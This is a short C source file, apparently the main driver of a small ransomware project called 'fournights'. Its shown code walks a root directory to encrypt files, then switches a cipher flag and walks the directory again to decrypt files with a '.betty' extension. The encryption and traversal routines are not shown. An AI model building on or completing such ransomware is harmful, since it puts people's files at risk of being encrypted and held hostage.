#include "fournights.h"
/**
  * sighandler - traps signals
  * @sig: Signal to trap
 **/
static void sighandler(int sig)
{
	if (sig == SIGINT)
	{
		write(1, "\nWTF?!\n", 7);
		exit(1);
	}
}


/**
  * main - Entry point
  * @ac: argument count
  * @av: argument vectors
  * Return: 0
  * TODO: need to eliminate hard coded strings.
 **/
int main(void)
{
	struct ransom_s ransom;

	/** handle signals **/
	if (signal(SIGINT, sighandler))
	{
#ifndef NO_DEBUG
		fprintf(stderr, "Signal Error\n");
#endif
	}

	printf("######################\n");
	printf("Starting to encrypt!\n");
	printf("######################\n");

	init_struct(&ransom);
	/* ENCRYPT */
	recurse_ls((char *)ransom.root_path, &ransom);
#ifndef NO_DEBUG
	print_for_debug(ransom);
	/* DECRYPT */
	printf("######################\n");
	printf("Starting to decrypt!\n");
	printf("######################\n");
#endif
	ransom.cipher_flag = 'd';

	/* reset file extension tokens */
	my_strncat(ransom.file_exts_whole_str, ".betty", 0, 6);
	ransom.file_exts_whole_str[6] = '\0';
	ransom.file_extensions[1] = NULL;

	recurse_ls((char *)ransom.root_path, &ransom);
	free_ransom_struct(&ransom);
#ifndef NO_DEBUG
	printf("######################\n");
	printf("Bye bye!\n");
	printf("######################\n");
#endif
	return (EXIT_SUCCESS);
}
